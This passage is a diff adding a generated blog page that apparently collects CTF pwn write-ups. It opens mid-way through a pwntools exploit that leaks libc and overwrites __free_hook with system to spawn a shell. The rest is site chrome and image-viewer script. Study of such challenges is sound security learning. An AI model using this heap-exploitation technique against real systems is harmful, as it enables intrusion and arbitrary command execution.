+    p.sendlineafter(&quot;[1/0]\n&gt;&gt; &quot;, b&quot;1&quot;)
+    p.sendlineafter(&quot;&gt;&gt;&quot;, str(t))
+
+
+
+for i in range(8):
+    add(i, 0x100, b&quot;aaaa&quot;)
+
+for i in range(8,10):
+    add(i, 0x70, b&quot;aaaa&quot;)
+
+for i in range(1,8):
+    free(i)
+
+free(0)
+add(0, 0x50, b'aaaaaaaa')
+show(0)
+libc.address = u64(p.recvuntil(b&quot;\x7f&quot;)[-6:].ljust(8, b&quot;\x00&quot;)) - libc.sym[&quot;__malloc_hook&quot;] - 0x170
+print(hex(libc.address))
+
+for i in range(1, 8):
+    add(i, 0x70, b'aaa')
+
+move(2, 17)
+add(10, 0x70, b'idx:10')
+for i in range(3, 10):
+    free(i)
+
+free(2)
+free(10)
+free(17)
+for i in range(2, 9):
+    add(i, 0x70, '\n')
+add(9, 0x70, p64(libc.sym[&quot;__free_hook&quot;]))
+add(11, 0x70, b'pass\n')
+add(12, 0x70, b'/bin/sh\x00\n')
+add(17, 0x70, p64(libc.sym[&quot;system&quot;]))
+free(12)
+
+gdb.attach(p)
+p.interactive()
+</code></pre>
+
+        </div>
+        <!-- Share to Twitter, Weibo, Telegram -->
+        <div class="flex items-center">
+          <div class="mr-4 flex items-center">
+            <i class="ri-share-forward-line text-gray-500"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-blue-500 hover:bg-blue-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTwitter">
+            <i class="ri-twitter-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-red-500 hover:bg-red-100 dark:hover:bg-gray-600 inline-flex" @click="shareToWeibo">
+            <i class="ri-weibo-line"></i>
+          </div>
+          <div class="px-4 cursor-pointer text-indigo-500 hover:bg-indigo-100 dark:hover:bg-gray-600 inline-flex" @click="shareToTelegram">
+            <i class="ri-telegram-line"></i>
+          </div>
+        </div>
+      </div>
+
+      
+
+      
+
+      <footer class="py-12 text-center px-4 md:px-0" v-pre>
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+</footer>
+
+<a href="https://kfxp12138.github.io//atom.xml" target="_blank" class="py-2 md:py-1 px-4 mx-4 inline-flex transition font-semibold rounded dark:hover:bg-gray-600 hover:bg-gray-200">
+  RSS
+</a>
+    </div>
+
+    <!-- TOC Container -->
+    <div class="fixed right-0 bottom-0 mb-16 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white dark:bg-gray-500 dark:text-gray-200 hover:shadow-lg transition-all animated fadeInRight" @click="showToc = true">
+      <i class="ri-file-list-line"></i>
+    </div>
+
+    <div class="fixed right-0 top-0 bottom-0 overflow-y-auto w-64 bg-white dark:bg-gray-800 p-4 border-l border-gray-100 dark:border-gray-600 z-10 transition-fast" :class="{ '-mr-64': !showToc }">
+      <div class="flex mb-4 justify-end">
+        <div class="w-8 h-8 inline-flex justify-center items-center rounded-full cursor-pointer hover:bg-gray-200 dark:hover:bg-gray-600 transition-fast" @click="showToc = false">
+          <i class="ri-close-line text-lg"></i>
+        </div>
+      </div>
+      <div class="post-toc-container">
+        <ul class="markdownIt-TOC">
+<li><a href="#week1">week1</a>
+<ul>
+<li><a href="#gdb">gdb</a></li>
+<li><a href="#pwn_land1">pwn_land1</a></li>
+<li><a href="#pwn_land2">pwn_land2</a></li>
+<li><a href="#orw">orw</a></li>
+</ul>
+</li>
+<li><a href="#week2">week2</a>
+<ul>
+<li><a href="#blind">blind</a></li>
+<li><a href="#oldfashion_note">oldfashion_note</a></li>
+<li><a href="#echo-sever">echo sever</a></li>
+</ul>
+</li>
+<li><a href="#week3">week3</a>
+<ul>
+<li><a href="#changeable-note">changeable note</a></li>
+<li><a href="#elder_note">elder_note</a></li>
+<li><a href="#sized_note">sized_note</a></li>
+</ul>
+</li>
+<li><a href="#week4">week4</a>
+<ul>
+<li><a href="#vector">vector</a></li>
+</ul>
+</li>
+</ul>
+
+      </div>
+    </div>
+
+    <!-- Back to top -->
+    <div class="fixed right-0 bottom-0 mb-4 mr-4 shadow w-8 h-8 rounded-full flex justify-center items-center z-10 cursor-pointer bg-white hover:shadow-lg transition-all dark:bg-gray-500 dark:text-gray-200" @click="backToUp" v-show="scrolled">
+      <i class="ri-arrow-up-line"></i>
+    </div>
+  </div>
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+  <!-- Background of PhotoSwipe. 
+        It's a separate element as animating opacity is faster than rgba(). -->
+  <div class="pswp__bg">
+  </div>
+  <!-- Slides wrapper with overflow:hidden. -->
+  <div class="pswp__scroll-wrap">
+    <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+    <div class="pswp__container">
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+      <div class="pswp__item">
+      </div>
+    </div>
+    <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+    <div class="pswp__ui pswp__ui--hidden">
+      <div class="pswp__top-bar">
+        <!--  Controls are self-explanatory. Order can be changed. -->
+        <div class="pswp__counter">
+        </div>
+        <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+        <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+        <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+        <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+        <!-- element will get class pswp__preloader--active when preloader is running -->
+        <div class="pswp__preloader">
+          <div class="pswp__preloader__icn">
+            <div class="pswp__preloader__cut">
+              <div class="pswp__preloader__donut">
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+        <div class="pswp__share-tooltip">
+        </div>
+      </div>
+      <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+      </button>
+      <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+      </button>
+      <div class="pswp__caption">
+        <div class="pswp__caption__center">
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+  <script src="https://kfxp12138.github.io//media/scripts/main.js"></script>
+  
+  <!-- Code Highlight -->
+  
+    <script src="https://kfxp12138.github.io//media/prism.js"></script>
+    <script>
+      Prism.highlightAll()
+    </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+  <script>
+    //拿到预览框架，也就是上面的html代码
+    var pswpElement = document.querySelectorAll('.pswp')[0];
+    //定义图片数组变量
+    var imgitems;
+    /**
+    * 用于显示预览界面
+    * @param index 图片数组下标
+    */
+    function viewImg(index) {
+      //其它选项这里不做过多阐述，详情见官网
+      var pswpoptions = {
+        index: parseInt(index, 10), // 开始幻灯片索引。0是第一张幻灯片。必须是整数，而不是字符串。
+        bgOpacity: 0.7, // 背景透明度，0-1
+        maxSpreadZoom: 3, // 缩放级别，不要太大
+      };
+      //初始化并打开PhotoSwipe，pswpElement对应上面预览框架，PhotoSwipeUI_Default为皮肤，imgitems为图片数组，pswpoptions为选项
+      var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, imgitems, pswpoptions);
+      gallery.init()
+    }
+    /**
+    * 用于添加图片点击事件
+    * @param img 图片元素
+    * @param index 所属下标（在imgitems中的位置）
+    */
+    function addImgClick(img, index) {
+      img.onclick = function() {
+        viewImg(index)
+      }
+    }
+    /**
+    * 轮询所有图片，获取src、width、height等数据，加入imgitems，并给图片元素添加事件
+    * 最好在onload中执行该方法，本站因放在最底部，所以直接初始化
+    * 异步加载图片可在图片元素创建完成后调用此方法
+    */
+    function initImg() {
+      //重置图片数组
+      imgitems = [];
+      //查找class:markdown 下的所有img元素并遍历
+      var imgs = document.querySelectorAll('.markdown img');
+      for (var i = 0; i < imgs.length; i++) {
+        var img = imgs[i];
+        //本站相册初始为loading图片，真实图片放在data-src
+        var ds = img.getAttribute("data-src");
+        //创建image对象，用于获取图片宽高
+        var imgtemp = new Image();
+        //判断是否存在data-src
+        if (ds != null && ds.length > 0) {
+          imgtemp.src = ds
+        } else {
+          imgtemp.src = img.src
+        }
+        //判断是否存在缓存
+        if (imgtemp.complete) {
+          var imgobj = {
+            "src": imgtemp.src,
+            "w": imgtemp.width,
+            "h": imgtemp.height,
+          };
+          imgitems[i] = imgobj;
+          addImgClick(img, i);
+        } else {
+          console.log('进来了2')
+          imgtemp.index = i;
+          imgtemp.img = img;
+          imgtemp.onload = function() {
+            var imgobj = {
+              "src": this.src,
+              "w": this.width,
+              "h": this.height,
+            };
+            //不要使用push，因为onload前后顺序会不同
+            imgitems[this.index] = imgobj
+            //添加点击事件
+            addImgClick(this.img, this.index);
+          }
+        }
+      }
+    }
+    //初始化
+    initImg();
+  </script>
+  
+  
+</body>
+
+</html>
